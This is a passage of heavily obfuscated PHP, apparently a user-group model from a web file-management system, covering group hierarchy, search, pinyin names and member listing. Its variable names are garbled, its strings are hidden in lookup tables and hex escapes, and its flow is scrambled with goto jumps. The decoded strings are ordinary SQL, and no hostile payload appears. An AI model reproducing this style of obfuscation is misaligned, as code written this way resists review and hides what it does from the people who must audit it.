$Dâç„¤Ñ‰ä[$e¬ÔùŠä±¤[1663]]) { return !1; } if ($a˜©Û¡³Ø¾[$e¬ÔùŠä±¤[479]] != $eˆİ‚›Şƒ[$e¬ÔùŠä±¤[479]]) { if ($Dâç„¤Ñ‰ä[$e¬ÔùŠä±¤[477]] !== $eˆİ‚›Şƒ[$e¬ÔùŠä±¤[477]] && strpos($Dâç„¤Ñ‰ä[$e¬ÔùŠä±¤[477]], $eˆİ‚›Şƒ[$e¬ÔùŠä±¤[477]] . $eˆİ‚›Şƒ[$e¬ÔùŠä±¤[1663]] . $e¬ÔùŠä±¤[47]) === 0) { return !1; } $a˜©Û¡³Ø¾[$e¬ÔùŠä±¤[542]] = $Dâç„¤Ñ‰ä[$e¬ÔùŠä±¤[477]] . $a˜©Û¡³Ø¾[$e¬ÔùŠä±¤[479]] . $e¬ÔùŠä±¤[47]; $this->_changeChildLevel($eˆİ‚›Şƒ, $Dâç„¤Ñ‰ä); } } if (isset($a˜©Û¡³Ø¾[$e¬ÔùŠä±¤[28]])) { $this->setNamePinyin($Fà¿Î¨˜öÚ, $a˜©Û¡³Ø¾[$e¬ÔùŠä±¤[28]]); } if (isset($a˜©Û¡³Ø¾[$e¬ÔùŠä±¤[1742]])) { $this->metaSet($Fà¿Î¨˜öÚ, array($e¬ÔùŠä±¤[1742] => $a˜©Û¡³Ø¾[$e¬ÔùŠä±¤[1742]], $e¬ÔùŠä±¤[1743] => $a˜©Û¡³Ø¾[$e¬ÔùŠä±¤[1743]])); unset($a˜©Û¡³Ø¾[$e¬ÔùŠä±¤[1742]]); unset($a˜©Û¡³Ø¾[$e¬ÔùŠä±¤[1743]]); } return $this->where(array($e¬ÔùŠä±¤[1744] => $Fà¿Î¨˜öÚ))->save($a˜©Û¡³Ø¾); } private function _changeChildLevel($dñ§½ØÑ™í, $E¹»†çÙè, $a«Õèâ¨Êè = false) { goto B¥…¤ËöÁ; fˆÛÒëğ¸â: if ($a«Õèâ¨Êè) { $e‘ÂÒìá¤Ò = $E¹»†çÙè[$Bó¯ƒ¡ˆ¾±[477]] . $E¹»†çÙè[$Bó¯ƒ¡ˆ¾±[1663]] . $Bó¯ƒ¡ˆ¾±[47]; } $dè’Ø„Ô®© = array($Bó¯ƒ¡ˆ¾±[542] => array($Bó¯ƒ¡ˆ¾±[501], $dñ§½ØÑ™í[$Bó¯ƒ¡ˆ¾±[477]] . $dñ§½ØÑ™í[$Bó¯ƒ¡ˆ¾±[1663]] . $Bó¯ƒ¡ˆ¾±[502])); $bÆ¢ä±‡ò = array($Bó¯ƒ¡ˆ¾±[542] => array($Bó¯ƒ¡ˆ¾±[550], "\x72\x65\160\154\x61\x63\x65\x28\160\x61\x72\x65\x6e\164\114\x65\166\145\154\54\x27{$B²ò³¿ÊÂ}\47\x2c\47{$e‘ÂÒìá¤Ò}\x27\x29")); goto E†‡Ö÷¥”¶; B¥…¤ËöÁ: $Bó¯ƒ¡ˆ¾± =& $_SERVER[òÀöí]; $B²ò³¿ÊÂ = $dñ§½ØÑ™í[$Bó¯ƒ¡ˆ¾±[477]] . $dñ§½ØÑ™í[$Bó¯ƒ¡ˆ¾±[1663]] . $Bó¯ƒ¡ˆ¾±[47]; $e‘ÂÒìá¤Ò = $E¹»†çÙè[$Bó¯ƒ¡ˆ¾±[477]] . $E¹»†çÙè[$Bó¯ƒ¡ˆ¾±[1663]] . $Bó¯ƒ¡ˆ¾±[47] . $dñ§½ØÑ™í[$Bó¯ƒ¡ˆ¾±[1663]] . $Bó¯ƒ¡ˆ¾±[47]; goto fˆÛÒëğ¸â; E†‡Ö÷¥”¶: $this->where($dè’Ø„Ô®©)->data($bÆ¢ä±‡ò)->save(); goto E‰¸ÆµàŒ§; E‰¸ÆµàŒ§: } public function setNamePinyin($BÙèÔ¢Ë‡£, $E®î»ÉÍ ¥ = false) { $eõÄµùŸŒ‡ =& $_SERVER[òÀöí]; if (!$E®î»ÉÍ ¥) { $e‹¬µÍøÆ· = $this->getInfoSimple($BÙèÔ¢Ë‡£); $E®î»ÉÍ ¥ = $e‹¬µÍøÆ·[$eõÄµùŸŒ‡[28]]; } if (!Input::check($E®î»ÉÍ ¥, $eõÄµùŸŒ‡[545])) { $this->metaSet($BÙèÔ¢Ë‡£, $eõÄµùŸŒ‡[433], null); $this->metaSet($BÙèÔ¢Ë‡£, $eõÄµùŸŒ‡[432], null); return; } $dÀ²Ù¬¿•Ç = array($eõÄµùŸŒ‡[433] => str_replace($eõÄµùŸŒ‡[50], $eõÄµùŸŒ‡[33], Pinyin::encode($E®î»ÉÍ ¥)), $eõÄµùŸŒ‡[432] => Pinyin::encode($E®î»ÉÍ ¥, $eõÄµùŸŒ‡[546])); $this->metaSet($BÙèÔ¢Ë‡£, $dÀ²Ù¬¿•Ç); } protected function groupStatus($AÎÄ»ºÙ¿ë, $f–­–‘·„…) { goto aÚÈÊÅÌ×š; aÚÈÊÅÌ×š: $fæÕÕÓ£øµ =& $_SERVER[òÀöí]; $BÇÂŠË”ò´ = $this->getInfoSimple($AÎÄ»ºÙ¿ë); if (!$BÇÂŠË”ò´) { return !1; } goto A×¾—Í¾; a‘Ç‘¢©‡†: foreach ($cˆàĞğÏÉ¨ as $AÎÄ»ºÙ¿ë) { $c”¹åÕƒò[] = array($fæÕÕÓ£øµ[1663] => $AÎÄ»ºÙ¿ë, $fæÕÕÓ£øµ[92] => $fæÕÕÓ£øµ[708], $fæÕÕÓ£øµ[368] => $f–­–‘·„…); } return Model($fæÕÕÓ£øµ[1745])->addAll($c”¹åÕƒò, array(), !0); goto fÄÂ„ÜÑßÁ; A×¾—Í¾: if ($f–­–‘·„… == $fæÕÕÓ£øµ[86]) { $cˆàĞğÏÉ¨ = $this->parentLevelArray($BÇÂŠË”ò´[$fæÕÕÓ£øµ[477]]); } else { $c¼òéËæÜì = array($fæÕÕÓ£øµ[542] => array($fæÕÕÓ£øµ[501], $BÇÂŠË”ò´[$fæÕÕÓ£øµ[477]] . $BÇÂŠË”ò´[$fæÕÕÓ£øµ[1663]] . $fæÕÕÓ£øµ[502])); $cˆàĞğÏÉ¨ = $this->where($c¼òéËæÜì)->field($fæÕÕÓ£øµ[1663])->select(); $cˆàĞğÏÉ¨ = array_to_keyvalue($cˆàĞğÏÉ¨, $fæÕÕÓ£øµ[33], $fæÕÕÓ£øµ[1663]); } $cˆàĞğÏÉ¨[] = $BÇÂŠË”ò´[$fæÕÕÓ£øµ[1663]]; $c”¹åÕƒò = array(); goto a‘Ç‘¢©‡†; fÄÂ„ÜÑßÁ: } protected function groupRemove($f†¶Ü‘æîË) { goto B½Í…•À; Eîï…®Ìá™: Model($F°ãôöå‹É[778])->groupRootRemove($f†¶Ü‘æîË); return $this->where($c†ÄÉ¡…ö)->delete(); goto eŠ‘±ó†; AÇÃ›çò“ç: $this->where(array($F°ãôöå‹É[479] => $f†¶Ü‘æîË))->save(array($F°ãôöå‹É[479] => $eµ¾³ù™£ˆ[$F°ãôöå‹É[479]])); Model($F°ãôöå‹É[1745])->where($c†ÄÉ¡…ö)->delete(); Model($F°ãôöå‹É[1746])->where($c†ÄÉ¡…ö)->delete(); goto Eîï…®Ìá™; DªÕÑù©¿: if (!$eµ¾³ù™£ˆ || $eµ¾³ù™£ˆ[$F°ãôöå‹É[479]] == 0) { return !1; } $aÓàˆ¯±• = $this->getInfoSimple($eµ¾³ù™£ˆ[$F°ãôöå‹É[479]]); $this->_changeChildLevel($eµ¾³ù™£ˆ, $aÓàˆ¯±•, !0); goto AÇÃ›çò“ç; B½Í…•À: $F°ãôöå‹É =& $_SERVER[òÀöí]; $c†ÄÉ¡…ö = array($F°ãôöå‹É[1663] => $f†¶Ü‘æîË); $eµ¾³ù™£ˆ = $this->where($c†ÄÉ¡…ö)->find(); goto DªÕÑù©¿; eŠ‘±ó†: } protected function groupSort($B×µºâ‹) { $B×‰„Ì£¼± =& $_SERVER[òÀöí]; $E­ ×ëé¦‡ = array(); foreach ($B×µºâ‹ as $cŠíàäøç => $cÓ²æÚà´) { $E­ ×ëé¦‡[] = array($B×‰„Ì£¼±[1663], $cÓ²æÚà´, $B×‰„Ì£¼±[1686], $cŠíàäøç + 1); } $this->saveAll($E­ ×ëé¦‡); } public function listData() { $FóÎ·‘¨£¬ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($FóÎ·‘¨£¬[$_SERVER[òÀöí][363]]); return $FóÎ·‘¨£¬; } private function _makeOrder($FŠçå­ÇÙÚ = '') { goto FÙ›¤…ØÅ‡; FÙ›¤…ØÅ‡: $c–“êËàå =& $_SERVER[òÀöí]; $Añ»ƒå¼…ƒ = array($c–“êËàå[1663], $c–“êËàå[28], $c–“êËàå[1649], $c–“êËàå[192]); $AªàÓ¼¤ŒÁ = array($c–“êËàå[419] => $c–“êËàå[420], $c–“êËàå[421] => $c–“êËàå[422]); goto c„¾çñ……Ø; c„¾çñ……Ø: $FÒšñêÃñº = Input::get($c–“êËàå[424], $c–“êËàå[7], $c–“êËàå[1667], $Añ»ƒå¼…ƒ); $Ašˆ´Ü­‘ = Input::get($c–“êËàå[425], $c–“êËàå[7], $c–“êËàå[1747], array($c–“êËàå[1747], $c–“êËàå[421])); $Ašˆ´Ü­‘ = $AªàÓ¼¤ŒÁ[$Ašˆ´Ü­‘]; goto c…ˆ‚°¤¯; c…ˆ‚°¤¯: $FŠçå­ÇÙÚ = $FŠçå­ÇÙÚ . "{$FÒšñêÃñº}\x20{$Ašˆ´Ü­‘}\x2c\40\147\162\x6f\165\x70\111\x44\x20\141\x73\143"; return $this->order($FŠçå­ÇÙÚ); goto dÃ‚ÀğËÉ; dÃ‚ÀğËÉ: } public function listChild($E¬ÎŠõÓÜ) { $e–ñ¾Ú»ä± =& $_SERVER[òÀöí]; $båœÕè÷ã = $this->where(array($e–ñ¾Ú»ä±[479] => $E¬ÎŠõÓÜ))->_makeOrder()->selectPage(200); $this->_listDataApply($båœÕè÷ã[$e–ñ¾Ú»ä±[363]]); return $båœÕè÷ã; } public function listByID($d¤Éƒœ•ë—) { $BÃª¾•¤¥ß =& $_SERVER[òÀöí]; if (!$d¤Éƒœ•ë—) { return array(); } $Bªçõ±ˆÕù = array($BÃª¾•¤¥ß[1663] => array($BÃª¾•¤¥ß[7], $d¤Éƒœ•ë—)); $e§Ï«¸£¡ã = $this->where($Bªçõ±ˆÕù)->select(); $this->_listDataApply($e§Ï«¸£¡ã); return $e§Ï«¸£¡ã; } public function listSearch($C˜Šë»•Î) { goto dâŞŠ·£ê•; cŠÌ÷‹§ºÅ: $Eë«¨¤¹ª³ = $Eë«¨¤¹ª³ ? $Eë«¨¤¹ª³ : array(); if (!$Eë«¨¤¹ª³ || count($Eë«¨¤¹ª³[$DÅ„ª¶®¢[363]]) < 5 && Input::check($bª°è¶Õñ´, $DÅ„ª¶®¢[314])) { goto B‹î¼™‰Ï; aØ»´ê‹ä: $b¸–ù£„½ = array_merge($dõ¸±¦†Ÿ‹, $aíçË°™­, $Eë«¨¤¹ª³[$DÅ„ª¶®¢[363]]); $Eë«¨¤¹ª³[$DÅ„ª¶®¢[363]] = array_unique_by_key($b¸–ù£„½, $DÅ„ª¶®¢[1663]); $Eë«¨¤¹ª³[$DÅ„ª¶®¢[360]][$DÅ„ª¶®¢[361]] = count($Eë«¨¤¹ª³[$DÅ„ª¶®¢[363]]); goto D—İó™–‘¥; D—İó™–‘¥: $Eë«¨¤¹ª³[$DÅ„ª¶®¢[360]][$DÅ„ª¶®¢[362]] = ceil($Eë«¨¤¹ª³[$DÅ„ª¶®¢[360]][$DÅ„ª¶®¢[361]] / $Eë«¨¤¹ª³[$DÅ„ª¶®¢[360]][$DÅ„ª¶®¢[358]]); goto c·‰·âÌ¿Õ; B‹î¼™‰Ï: $A³×¦‚ºØ = $this->groupChildrenAll($BğÑ²Çù¦„); $dõ¸±¦†Ÿ‹ = $this->_searchFromMeta($DÅ„ª¶®¢[432], $bª°è¶Õñ´, 10, $A³×¦‚ºØ); $aíçË°™­ = $this->_searchFromMeta($DÅ„ª¶®¢[433], $bª°è¶Õñ´, 10, $A³×¦‚ºØ); goto aØ»´ê‹ä; c·‰·âÌ¿Õ: } $this->_listDataApply($Eë«¨¤¹ª³[$DÅ„ª¶®¢[363]]); goto E¼ˆ†œ‹…; eŒ‡ÜÆà‡´: if (!trim($bª°è¶Õñ´)) { return !1; } $bª°è¶Õñ´ = str_replace($DÅ„ª¶®¢[1750], $DÅ„ª¶®¢[1751], $bª°è¶Õñ´); $Dœõƒ»ßÕ = array($DÅ„ª¶®¢[1663] => array($DÅ„ª¶®¢[375], "{$bª°è¶Õñ´}\45"), $DÅ„ª¶®¢[28] => array($DÅ„ª¶®¢[375], "\45{$bª°è¶Õñ´}\45"), $DÅ„ª¶®¢[936] => $DÅ„ª¶®¢[1752]); goto E‡Ë‰“ö¼; dâŞŠ·£ê•: $DÅ„ª¶®¢ =& $_SERVER[òÀöí]; $bª°è¶Õñ´ = $C˜Šë»•Î[$DÅ„ª¶®¢[1748]]; $BğÑ²Çù¦„ = isset($C˜Šë»•Î[$DÅ„ª¶®¢[1749]]) ? $C˜Šë»•Î[$DÅ„ª¶®¢[1749]] : !1; goto eŒ‡ÜÆà‡´; E¼ˆ†œ‹…: return $Eë«¨¤¹ª³; goto E¢†ìÛÆçˆ; E‡Ë‰“ö¼: if ($BğÑ²Çù¦„) { $Açœòì·½² = $this->getInfoSimple($BğÑ²Çù¦„); $b‹ä‰†„°¢ = $Açœòì·½²[$DÅ„ª¶®¢[477]] . $BğÑ²Çù¦„ . $DÅ„ª¶®¢[502]; $Dœõƒ»ßÕ = array($Dœõƒ»ßÕ, array($DÅ„ª¶®¢[477] => array($DÅ„ª¶®¢[375], $b‹ä‰†„°¢))); } $Dœõƒ»ßÕ = $this->parseWhereLike($Dœõƒ»ßÕ); $Eë«¨¤¹ª³ = $this->_makeOrder()->where($Dœõƒ»ßÕ)->selectPage(20); goto cŠÌ÷‹§ºÅ; E¢†ìÛÆçˆ: } protected function groupChildrenAll($f—ğâŒÂïÎ) { $a–´Êœ¾ğÕ =& $_SERVER[òÀöí]; if (!$f—ğâŒÂïÎ) { return !1; } if (is_string($f—ğâŒÂïÎ)) { $f—ğâŒÂïÎ = array($f—ğâŒÂïÎ); } $dÎ—µ‡æ£ = $f—ğâŒÂïÎ; foreach ($f—ğâŒÂïÎ as $aŒìªŸØŒİ) { $d³Šˆƒ±š = $this->getInfoSimple($aŒìªŸØŒİ); $A’ËÇˆŞÎ¶ = array($a–´Êœ¾ğÕ[477] => array($a–´Êœ¾ğÕ[375], $d³Šˆƒ±š[$a–´Êœ¾ğÕ[477]] . $aŒìªŸØŒİ . $a–´Êœ¾ğÕ[502])); $e˜ã§Ğ«„¼ = $this->field($a–´Êœ¾ğÕ[1663])->where($A’ËÇˆŞÎ¶)->select(); $dÎ—µ‡æ£ = array_merge($dÎ—µ‡æ£, array_to_keyvalue($e˜ã§Ğ«„¼, $a–´Êœ¾ğÕ[33], $a–´Êœ¾ğÕ[1663])); } return array_unique($dÎ—µ‡æ£); } private function _searchFromMeta($d²îÈĞ®‘, $e¦»‘½‰–, $FÌŸÛ’ˆŸˆ, $d”¦Ğä´) { goto D‚¼Ì³õ¦; C´¬µ¿é‡Î: if (!$E¶İ¿‡ÒŸÏ) { return array(); } $E¶İ¿‡ÒŸÏ = array_to_keyvalue($E¶İ¿‡ÒŸÏ, $BŒ†Èê‰˜Ÿ[33], $BŒ†Èê‰˜Ÿ[1663]); $Cƒ‹ÅŞ¿¼º = $this->where(array($BŒ†Èê‰˜Ÿ[1744] => array($BŒ†Èê‰˜Ÿ[7], $E¶İ¿‡ÒŸÏ)))->select(); goto EÏ÷‰£Ù®; FŞ‚„´öÇÕ: $bœˆœ¸ñğ = $this->parseWhereLike($bœˆœ¸ñğ); if ($d”¦Ğä´) { $bœˆœ¸ñğ[$BŒ†Èê‰˜Ÿ[1663]] = array($BŒ†Èê‰˜Ÿ[7], $d”¦Ğä´); } $E¶İ¿‡ÒŸÏ = Model($BŒ†Èê‰˜Ÿ[1753])->where($bœˆœ¸ñğ)->limit($FÌŸÛ’ˆŸˆ)->select(); goto C´¬µ¿é‡Î; EÏ÷‰£Ù®: if (!$Cƒ‹ÅŞ¿¼º) { return array(); } return $Cƒ‹ÅŞ¿¼º; goto FĞ•¦˜³Ñ; D‚¼Ì³õ¦: $BŒ†Èê‰˜Ÿ =& $_SERVER[òÀöí]; $e¦»‘½‰– = strtolower($e¦»‘½‰–); $bœˆœ¸ñğ = array($BŒ†Èê‰˜Ÿ[92] => $d²îÈĞ®‘, $BŒ†Èê‰˜Ÿ[368] => array($BŒ†Èê‰˜Ÿ[375], "\45{$e¦»‘½‰–}\45")); goto FŞ‚„´öÇÕ; FĞ•¦˜³Ñ: } protected function _listDataApplyItem($EÏ±º›¥ïò) { $fî¬õ²ÜŠ = array($EÏ±º›¥ïò); $this->_listDataApply($fî¬õ²ÜŠ); return $fî¬õ²ÜŠ[0]; } protected function _listDataApply(&$F¦´Î‘Ä¾) { goto b‡«µÎöİ©; b‡«µÎöİ©: $C‹ğÂ÷‚½Æ =& $_SERVER[òÀöí]; if (!$F¦´Î‘Ä¾) { return; } $DÚ™¡ÈºÚ‘ = array_to_keyvalue($F¦´Î‘Ä¾, $C‹ğÂ÷‚½Æ[33], $C‹ğÂ÷‚½Æ[1663]); goto A¬àÃé¸Ù´; A¬àÃé¸Ù´: $this->_listAppendChildren($F¦´Î‘Ä¾); $this->_listAppendChildrenMember($F¦´Î‘Ä¾); $this->_listAppendMeta($F¦´Î‘Ä¾, $DÚ™¡ÈºÚ‘); goto B›‹ÑŒ“À; B›‹ÑŒ“À: $this->_listAppendParent($F¦´Î‘Ä¾); $this->_listAppendSourceRoot($F¦´Î‘Ä¾, $DÚ™¡ÈºÚ‘); goto D¼÷Ò”·á; D¼÷Ò”·á: } private function _listAppendChildren(&$EáÉ‰¹¹Š©) { goto f‹„‚ë”•İ; DÕğ¸Ö’ØÁ: $BˆéÜ›´Ë« = array_to_keyvalue($BˆéÜ›´Ë«, $a”³¨ƒëº¬[468]); foreach ($EáÉ‰¹¹Š© as &$CßùŸ×’Á) { $CßùŸ×’Á[$a”³¨ƒëº¬[1754]] = isset($BˆéÜ›´Ë«[$CßùŸ×’Á[$a”³¨ƒëº¬[1663]] . $a”³¨ƒëº¬[1755]]); } unset($CßùŸ×’Á); goto Eñ½šÊìÄ—; C•ËêÊÒ: $B‰Š½ÔìÆù = count($EáÉ‰¹¹Š©); $E–‹ÍÙ¸·¡ = $this->tablePrefix . $this->tableName; for ($eÔ—‘ª‰ƒ = 0, $A·»‰‡‘ÒŠ = 0; $eÔ—‘ª‰ƒ < $B‰Š½ÔìÆù; $eÔ—‘ª‰ƒ++) { $A·»‰‡‘ÒŠ++; $B‹ÍøŒùô¨ = $EáÉ‰¹¹Š©[$eÔ—‘ª‰ƒ][$a”³¨ƒëº¬[1663]]; $EíğÃïÙ±Í .= "\123\x45\x4c\x45\103\124\40\52\x20\106\x52\117\x4d\40\50\123\x45\x4c\x45\103\124\x20\47{$B‹ÍøŒùô¨}\137\x63\x68\x69\154\x64\x27\x20\x61\163\40\x68\141\x73\40\x46\x52\x4f\x4d\x20\x60{$E–‹ÍÙ¸·¡}\x60\x20\167\150\145\x72\145\x20\160\x61\162\x65\156\164\x49\x44\x3d{$B‹ÍøŒùô¨}\40\x6c\151\155\151\x74\40\61\x29\40\x61\163\40\x74\142\x5f{$B‹ÍøŒùô¨}\40\x75\x6e\x69\157\x6e\x20\x61\x6c\x6c\x20"; if (($A·»‰‡‘ÒŠ >= 20 || $eÔ—‘ª‰ƒ == $B‰Š½ÔìÆù - 1) && $EíğÃïÙ±Í) { $EíğÃïÙ±Í = substr($EíğÃïÙ±Í, 0, -strlen($a”³¨ƒëº¬[467])); $C–Ë­¤„ã• = $this->query($EíğÃïÙ±Í); $BˆéÜ›´Ë« = array_merge($BˆéÜ›´Ë«, $C–Ë­¤„ã•); $A·»‰‡‘ÒŠ = 0; $EíğÃïÙ±Í = $a”³¨ƒëº¬[33]; } } goto DÕğ¸Ö’ØÁ; f‹„‚ë”•İ: $a”³¨ƒëº¬ =& $_SERVER[òÀöí]; $EíğÃïÙ±Í = $a”³¨ƒëº¬[370]; $BˆéÜ›´Ë« = array(); goto C•ËêÊÒ; Eñ½šÊìÄ—: } private function _listAppendChildrenMember(&$dëâ˜ÛÓÅ) { goto aÌãÕíñ«ê; aÌãÕíñ«ê: $aÓ¥ÇÎÒÖç =& $_SERVER[òÀöí]; $B—îå„ÏÛ = $aÓ¥ÇÎÒÖç[370]; $D®ì‹÷Ú•² = array(); goto bÅÑ¶Î»ƒ; bÅÑ¶Î»ƒ: $Cƒ‹›Ã‚Ì = count($dëâ˜ÛÓÅ); $B¶ÌØÌÜçœ = $this->tablePrefix . $aÓ¥ÇÎÒÖç[1746]; for ($e¯†·ê¾²õ = 0, $e…—ÖÉ¸”Ò = 0; $e¯†·ê¾²õ < $Cƒ‹›Ã‚Ì; $e¯†·ê¾²õ++) { $e…—ÖÉ¸”Ò++; $E‰—™£Àë® = $dëâ˜ÛÓÅ[$e¯†·ê¾²õ][$aÓ¥ÇÎÒÖç[1663]]; $B—îå„ÏÛ .= "\x53\105\x4c\105\x43\124\x20\x2a\x20\106\122\117\115\x20\50\123\x45\x4c\x45\103\124\x20\47{$E‰—™£Àë®}\x5f\x63\x68\x69\x6c\144\47\x20\x61\x73\x20\150\141\x73\x20\x46\122\117\x4d\40\x60{$B¶ÌØÌÜçœ}\x60\x20\167\150\x65\x72\x65\40\x67\162\x6f\165\160\x49\x44\75{$E‰—™£Àë®}\40\x6c\x69\155\151\164\x20\61\x29\x20\x61\x73\40\164\142\x5f{$E‰—™£Àë®}\40\x75\x6e\x69\x6f\156\x20\x61\154\154\x20"; if (($e…—ÖÉ¸”Ò >= 20 || $e¯†·ê¾²õ == $Cƒ‹›Ã‚Ì - 1) && $B—îå„ÏÛ) { $B—îå„ÏÛ = substr($B—îå„ÏÛ, 0, -strlen($aÓ¥ÇÎÒÖç[467])); $d›âÕŸŒ‹ = $this->query($B—îå„ÏÛ); $D®ì‹÷Ú•² = array_merge($D®ì‹÷Ú•², $d›âÕŸŒ‹); $e…—ÖÉ¸”Ò = 0; $B—îå„ÏÛ = $aÓ¥ÇÎÒÖç[33]; } } goto BÇ¸¶ãóÃ†; BÇ¸¶ãóÃ†: $D®ì‹÷Ú•² = array_to_keyvalue($D®ì‹÷Ú•², $aÓ¥ÇÎÒÖç[468]); foreach ($dëâ˜ÛÓÅ as &$bŒØ›˜Ô®) { $bŒØ›˜Ô®[$aÓ¥ÇÎÒÖç[1756]] = isset($D®ì‹÷Ú•²[$bŒØ›˜Ô®[$aÓ¥ÇÎÒÖç[1663]] . $aÓ¥ÇÎÒÖç[1755]]); } unset($bŒØ›˜Ô®); goto EãÂ˜¸Á; EãÂ˜¸Á: } private function _listAppendMeta(&$Eï¯ğåèŞ¿, $díêïÃ­—) { goto CÅéÚ‚¸¬—; C¥íÁÎ Ùœ: $eßÏ¥òáÖ¨ = array_to_keyvalue_group($eßÏ¥òáÖ¨, $F†°©êÊ×[1663]); foreach ($eßÏ¥òáÖ¨ as &$E¬ˆœÉ–¢Ò) { $E¬ˆœÉ–¢Ò = array_to_keyvalue($E¬ˆœÉ–¢Ò, $F†°©êÊ×[92], $F†°©êÊ×[368]); } unset($E¬ˆœÉ–¢Ò); goto b­·¥®¯Ê; b­·¥®¯Ê: foreach ($Eï¯ğåèŞ¿ as &$dîöÃåŞ¾¼) { $dîöÃåŞ¾¼[$F†°©êÊ×[434]] = array(); if (isset($eßÏ¥òáÖ¨[$dîöÃåŞ¾¼[$F†°©êÊ×[1663]]])) { $dîöÃåŞ¾¼[$F†°©êÊ×[434]] = $eßÏ¥òáÖ¨[$dîöÃåŞ¾¼[$F†°©êÊ×[1663]]]; } } unset($dîöÃåŞ¾¼); goto eîŠ›º‡†ø; CÅéÚ‚¸¬—: $F†°©êÊ× =& $_SERVER[òÀöí]; $e·Æ Ôµ¯Ù = array($F†°©êÊ×[1663] => array($F†°©êÊ×[7], $díêïÃ­—)); $eßÏ¥òáÖ¨ = Model($F†°©êÊ×[1745])->where($e·Æ Ôµ¯Ù)->select(); goto C¥íÁÎ Ùœ; eîŠ›º‡†ø: } protected function parentLevelArray($f§Àù‘ÆÇÚ) { $B©Êñ“® =& $_SERVER[òÀöí]; $f§Àù‘ÆÇÚ = explode($B©Êñ“®[47], trim($f§Àù‘ÆÇÚ, $B©Êñ“®[47])); $f§Àù‘ÆÇÚ = array_remove_value($f§Àù‘ÆÇÚ, $B©Êñ“®[486]); return $f§Àù‘ÆÇÚ; } private function _listAppendParent(&$fŠŒ™ñ‘Ñ) { goto a¥µ—É…øÓ; Dİ¿åéÙ¾µ: unset($f£À½“ÙŠ¤); $BŠóÑ‹™¾¿ = array(); foreach ($f”ÏÒµè¸Ÿ as $DÛö¿†ÀÃŞ => $C§Ãà·é£) { if (!$C§Ãà·é£) { $BŠóÑ‹™¾¿[] = $DÛö¿†ÀÃŞ; } } goto fÎªÂìâ·Œ; D•Æ‘”ƒ¸á: unset($f£À½“ÙŠ¤); goto cÀÒ¶‡ŞÜ‡; fÎªÂìâ·Œ: if ($BŠóÑ‹™¾¿) { $böÅÜÒ£Í« = array($B¹³½Ğ—´[1744] => array($B¹³½Ğ—´[402], $BŠóÑ‹™¾¿)); $aéµ¯¿çå = $this->field($B¹³½Ğ—´[1757])->where($böÅÜÒ£Í«)->select(); $d³”ì›šÜ = array_to_keyvalue($aéµ¯¿çå, $B¹³½Ğ—´[1663], $B¹³½Ğ—´[28]); $f”ÏÒµè¸Ÿ = array_merge_index($f”ÏÒµè¸Ÿ, $d³”ì›šÜ); } $C•±‰Ôô° = $GLOBALS[$B¹³½Ğ—´[6]][$B¹³½Ğ—´[87]][$B¹³½Ğ—´[1758]]; foreach ($fŠŒ™ñ‘Ñ as &$f£À½“ÙŠ¤) { $D±›µÚ±Œ± = $this->parentLevelArray($f£À½“ÙŠ¤[$B¹³½Ğ—´[477]]); $fõÀİá²† = $B¹³½Ğ—´[33]; foreach ($D±›µÚ±Œ± as $DÛö¿†ÀÃŞ => $BØÁ¸±ÜòŠ) { if ($C•±‰Ôô° && $DÛö¿†ÀÃŞ == 0) { continue; } $fõÀİá²† .= $f”ÏÒµè¸Ÿ[$BØÁ¸±ÜòŠ] . $B¹³½Ğ—´[8]; } if ($D±›µÚ±Œ±) { $fõÀİá²† .= $f£À½“ÙŠ¤[$B¹³½Ğ—´[28]]; } $f£À½“ÙŠ¤[$B¹³½Ğ—´[481]] = str_replace($B¹³½Ğ—´[485], $B¹³½Ğ—´[8], $fõÀİá²†); } goto D•Æ‘”ƒ¸á; a¥µ—É…øÓ: $B¹³½Ğ—´ =& $_SERVER[òÀöí]; $f”ÏÒµè¸Ÿ = array(); foreach ($fŠŒ™ñ‘Ñ as &$f£À½“ÙŠ¤) { $f”ÏÒµè¸Ÿ[$f£À½“ÙŠ¤[$B¹³½Ğ—´[1663]]] = $f£À½“ÙŠ¤[$B¹³½Ğ—´[28]]; $D±›µÚ±Œ± = $this->parentLevelArray($f£À½“ÙŠ¤[$B¹³½Ğ—´[477]]); foreach ($D±›µÚ±Œ± as $BØÁ¸±ÜòŠ) { if (!isset($f”ÏÒµè¸Ÿ[$BØÁ¸±ÜòŠ])) { $f”ÏÒµè¸Ÿ[$BØÁ¸±ÜòŠ] = 0; } } } goto Dİ¿åéÙ¾µ; cÀÒ¶‡ŞÜ‡: } private function _listAppendSourceRoot(&$a‚Ê’¶å¢—, $F½ÅÕÓÓ¤å) { goto d”Ò•›ó; d”Ò•›ó: $F‚ìÍÔã©ê =& $_SERVER[òÀöí]; $EŸéÇ¯¢¬À = array($F‚ìÍÔã©ê[389] => SourceModel::TYPE_GROUP, $F‚ìÍÔã©ê[479] => 0, $F‚ìÍÔã©ê[474] => array($F‚ìÍÔã©ê[7], $F½ÅÕÓÓ¤å)); $b‰÷Š„§† = $F‚ìÍÔã©ê[1759]; goto eˆ¤Ã¤ª; bİºÊ´©åù: foreach ($a‚Ê’¶å¢— as &$e•‘í×“®–) { $e•‘í×“®–[$F‚ìÍÔã©ê[84]] = $CÌäèéÊ¿±[$e•‘í×“®–[$F‚ìÍÔã©ê[1663]]] ? $CÌäèéÊ¿±[$e•‘í×“®–[$F‚ìÍÔã©ê[1663]]] : array(); } unset($e•‘í×“®–); goto c±¤øÕÅ¡; eˆ¤Ã¤ª: $CÌäèéÊ¿± = Model($F‚ìÍÔã©ê[778])->order($F‚ìÍÔã©ê[1760])->field($b‰÷Š„§†)->where($EŸéÇ¯¢¬À)->select(); $CÌäèéÊ¿± = array_to_keyvalue($CÌäèéÊ¿±, $F‚ìÍÔã©ê[474]); $CÌäèéÊ¿± = array_remove_key($CÌäèéÊ¿±, $F‚ìÍÔã©ê[474]); goto bİºÊ´©åù; c±¤øÕÅ¡: } protected function groupMerge($FšæâÆ³ÊŞ) { $FšæâÆ³ÊŞ = array_values(array_unique($FšæâÆ³ÊŞ)); $AÀªíô‹Û = array(); for ($AßØîê¯ËÈ = 0; $AßØîê¯ËÈ < count($FšæâÆ³ÊŞ); $AßØîê¯ËÈ++) { $AÁÃ÷ˆöÖ² = !1; for ($dÆ²•öÙğõ = 0; $dÆ²•öÙğõ < count($FšæâÆ³ÊŞ); $dÆ²•öÙğõ++) { if ($AßØîê¯ËÈ == $dÆ²•öÙğõ) { continue; } if ($this->isParentOf($FšæâÆ³ÊŞ[$dÆ²•öÙğõ], $FšæâÆ³ÊŞ[$AßØîê¯ËÈ])) { $AÁÃ÷ˆöÖ² = !0; break; } } if 